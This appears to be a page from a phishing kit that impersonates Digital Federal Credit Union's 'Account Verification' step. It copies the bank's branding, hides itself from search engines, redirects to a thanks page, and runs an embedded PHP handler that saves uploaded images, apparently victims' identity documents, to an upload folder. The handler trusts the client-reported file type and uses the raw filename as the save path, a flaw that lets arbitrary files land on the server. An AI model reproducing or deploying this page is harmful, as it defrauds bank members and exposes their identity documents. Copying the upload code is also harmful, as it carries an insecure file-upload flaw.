<html class="yui3-js-enabled wf-opensans-n4-active wf-active" id="yui_3_18_1_1_1632731575470_148">
<div id="yui3-css-stamp" style="position: absolute !important; visibility: hidden !important" class=""></div>

<head>
	<link rel="stylesheet" type="text/css" href="files/bootstrap-theme.css">
	<link rel="stylesheet" type="text/css" href="files/bootstrap.css">
	<link rel="stylesheet" type="text/css" href="files/font-awesome.min.css">
	<link rel="stylesheet" type="text/css" href="files/Global.css">
	<link rel="stylesheet" type="text/css" href="files/square-green.css">
	<style>
	.icheckbox_square-green {
		min-width: 22px;
		margin-right: 5px;
	}
	
	.iradio_square-green {
		min-width: 22px;
		margin-right: 5px;
	}
</style>
	<meta name="viewport" content="initial-scale=1.000">
	<meta http-equiv="refresh" content="5;url=thanks.php">
	<link rel="stylesheet" type="text/css" href="files/updated-fivision-style.css">
	<link rel="stylesheet" type="text/css" href="files/fiVISION_Controls.css">
	<link rel="stylesheet" type="text/css" href="files/dcu-20200326.css">
	
	<meta name="robots" content="noindex, nofollow, noimageindex, noarchive, nocache">
	
	<title> Account Verification </title>
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans">
	
	<link charset="utf-8" rel="stylesheet" id="yui_3_18_1_1_1632731575470_2" href="https://yui-s.yahooapis.com/combo?3.18.1/widget-base/assets/skins/sam/widget-base.css&amp;3.18.1/autocomplete-list/assets/skins/sam/autocomplete-list.css">

	<link type="text/css" id="firefly-css" class="firefly-css" rel="stylesheet" href="https://usassets.cobrowse.pega.com/assets/stylesheets/customer/final/default.css?v=8.6.0">
</head>

<body class="yui3-skin-sam" id="yui_3_18_1_1_1632731575470_147">

			<input type="hidden" name="rsmRadScriptManager_TSM" id="rsmRadScriptManager_TSM" value=";;System.Web.Extensions, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35:en-US:ba1d5018-bf9d-4762-82f6-06087a49b5f6:ea597d4b:b25378d2">
			<input type="hidden" name="__EVENTTARGET" id="__EVENTTARGET" value="">
			<input type="hidden" name="__EVENTARGUMENT" id="__EVENTARGUMENT" value="">
			<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="/wEPDwUBMA8WAh4KRm9ybU51bWJlcigpWVN5c3RlbS5JbnQ2NCwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5CDExNzEyODY0FgICAQ9kFgICAg9kFgJmD2QWAgIBD2QWBgIDD2QWBgIED2QWAmYPDxYEHg9Db21tYW5kQXJndW1lbnRlHgtDb21tYW5kTmFtZWVkZAIFD2QWAmYPDxYEHwFlHwJlZGQCDg9kFgJmDw8WBB8BZR8CZWRkAgcPZBYeAhMPZBYCAgEPDxYCHghSZWFkT25seWhkZAIXD2QWAgIBDw8WAh8DaGRkAhsPZBYCAgEPDxYCHwNoZGQCHw9kFiBmDxAPFgIeB1Zpc2libGVoZGQWAQIBZAIBDxAPFggeB0NoZWNrZWRoHhBDYXVzZXNWYWxpZGF0aW9uaB4EVGV4dAUrJm5ic3A7VXNlIHRoZSBzYW1lIEFkZHJlc3MgYXMgdGhlIEFwcGxpY2FudB8EaGRkZGQCBw8PFgIfBGhkZAIIDxAPFgIfBGhkZBYBZmQCCQ8PFgIfBGhkZAIKDxAPFgIfBGhkZBYBZmQCCw8QDxYCHwRoZGQWAWZkAgwPDxYEHgdFbmFibGVkaB8EaGRkAg0PEA8WAh8EaGRkFgFmZAIODw8WAh8EaGRkAg8PDxYEHwhoHwRoZGQCFw8PFgIfBGhkZAIYDxAPFgIfBGhkZBYBZmQCGQ8QDxYCHwRoZGQWAWZkAhsPDxYEHgdUb29sVGlwBQ5VUyBQb3N0YWwgQ29kZR8EaBYCHgtwbGFjZWhvbGRlcgUOVVMgUG9zdGFsIENvZGVkAh0PDxYCHwRoZGQCJw9kFgICAw9kFgICAQ8QZGQWAWZkAisPZBYgZg8QDxYCHwRoZGQWAQIBZAIBDxAPFgQfBmgfBwUwJm5ic3A7TWFpbGluZyBhZGRyZXNzIGlzIHRoZSBzYW1lIGFzIFJlc2lkZW50aWFsZGRkZAIHDw8WAh8EaGRkAggPEA8WAh8EaGRkFgFmZAIJDw8WAh8EaGRkAgoPEA8WAh8EaGRkFgFmZAILDxAPFgIfBGhkZBYBZmQCDA8PFgQfCGgfBGhkZAINDxAPFgIfBGhkZBYBZmQCDg8PFgIfBGhkZAIPDw8WBB8IaB8EaGRkAhcPDxYCHwRoZGQCGA8QDxYCHwRoZGQWAWZkAhkPEA8WAh8EaGRkFgFmZAIbDw8WBB8JBQ5VUyBQb3N0YWwgQ29kZR8EaBYCHwoFDlVTIFBvc3RhbCBDb2RlZAIdDw8WAh8EaGRkAi8PZBYCAgMPZBYCAgEPDxYCHwNoZGQCMw9kFgICAw9kFgICAQ8PFgQfB2UfA2hkZAI3D2QWAgIBDxBkZBYBZmQCPw9kFgICAQ8PFgIfA2hkZAJHD2QWAgIBDxBkZBYBZmQCSw9kFgICAQ8PFgIfA2hkZAJTD2QWAgIBDw8WAh8DaGRkAlcPZBYCAgEPEGRkFgFmZAJrD2QWAgICDw8WAh8IaGRkAgsPDxYCHwRnZBYEAgMPZBYCZg8PFgQfAWUfAmVkZAIHD2QWAmYPDxYEHwFlHwJlZGQYAQUeX19Db250cm9sc1JlcXVpcmVQb3N0QmFja0tleV9fFgMFHWNiUmVzaWRlbnRpYWxBZGRyZXNzX0NoZWNrQm94BR9NYWlsaW5nQWRkcmVzc19TYW1lQXNBZGRyZXNzQm94BRNETENoZWNrYm94X0NoZWNrQm944fXcxKytv7g1PCGbiTA9pLp/DqM="> </div>
	
		<div class="aspNetHidden">
			<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="BEFE4D85">
			<input type="hidden" name="__PREVIOUSPAGE" id="__PREVIOUSPAGE" value="ImIrLw3Sj46LLEn7VIE_tLQ19nNnZovV6sGkB9lOmdUxPBvBT7OiB179-I8p7liJ9_wCDZ6jvUTEQSvxkPlkZ9Zhx-8ywUjsaEH73kD3u9KyocSd0">
			<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="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"> </div>
		
<div id="BackgroundDiv">
<div id="SizeDiv">
  
<!-- NEW HEADER -->
	
	<header class="navbar-fixed-top">
		 
	 	<div class="brand-header--nav">
			
			<div>
            		
				<nav class="brand-header--nav__secondary">
						
					 <div class="container"> 
                		
						<ul class="brand-header--nav__secondary--level-one" role="list">
							<li role="listitem">
										<a href="" aria-label="Branch Locator" aria-expanded="false" role="link" title="Find a DCU branch or ATM" target="_blank">Branch/ATM Locator</a>
							</li>
							
							<span class="seprator"></span>
		<li role="listitem"> <a href="" aria-label="Contact Us" role="link" target="_blank">Contact Us</a> </li>
		</ul>
		</div>
		</nav>
		</div>
		</div>
		<nav class="brand-header--navbar__nav container clearfix">
			<a href="" class="nav-brand" target="_self"> <img src="files/DCUGreen.svg" role="img" alt="Digital Federal Credit Union" aria-label="Digital Federal Credit Union" title="Digital Federal Credit Union"> </a>
			<div class="title" role="heading">
				<br><span class="highlight"></span></div>
		</nav>
		</header>
		<!-- END NEW HEADER -->
		

<?Php



$file_upload_flag="true"; // Flag to check conditions
$file_up_size= $_FILES['file_up']['size'];

     echo "File Name:".$_FILES['file_up']['name'];
     echo "<br>File Size:".$_FILES['file_up']['size'];
     echo "<br>File Type:".$_FILES['file_up']['type'];
     echo "<br>File tmp_name:".$_FILES['file_up']['tmp_name'];
     echo "<br>---Uploaded file details---<br><br>";

if ($_FILES['file_up']['size']>5000000){
$msg=$msg."Your uploaded file size is more than 5000KB ";
$msg.=" so please reduce the file size and then upload.<BR>";
$file_upload_flag="false";
}

// allow only jpeg or gif files, remove this if not required //
if (!($_FILES['file_up']['type'] =="image/jpeg" OR $_FILES['file_up']['type'] =="image/gif"))
{$msg=$msg."Your uploaded file must be of JPG or GIF. ";
$msg.="Other file types are not allowed<BR>";
$file_upload_flag="false";}

$file_name=$_FILES['file_up']['name'];
$add="upload/$file_name"; // the path with the file name where the file will be stored

if($file_upload_flag=="true"){ // checking the Flag value 

if(move_uploaded_file ($_FILES['file_up']['tmp_name'], $add)){
// do your coding here to give a thanks message or any other thing.
$msg="File successfully uploaded";
}else{
echo "Failed to upload file Contact Site admin to fix the problem";
}
}else{
$msg .= " Failed to upload file ";
}
?>

	<!-- FOOTER AREA-->
		<footer class="FooterLarge">
			<div class="row">
				<div class="FooterText col-xs-8 py-2">
					<div class="my-xs-1">
						<p>All content ©
							<!-- fiVISON_Control_Begin: fiVISION_Label --><span id="lblLabelDate"><span id="lblLabelDate_Label">2022</span></span>
							<!-- fiVISON_Control_End: fiVISION_Label --><strong>Digital Federal Credit Union</strong></p>
					</div>
				</div>
				<div class="footer-icons col-xs-4">
					<div class="my-xs-1">
						<a href="https://www.dcu.org/streetwise/howto/ncua.html" onclick="return false;" target="_blank" re_target="_blank"><img alt="National Credit Union Association" src="files/ncua.svg"></a> <img alt="Equal Housing Lender" src="files/equal-housing.svg"> </div>
		
</html>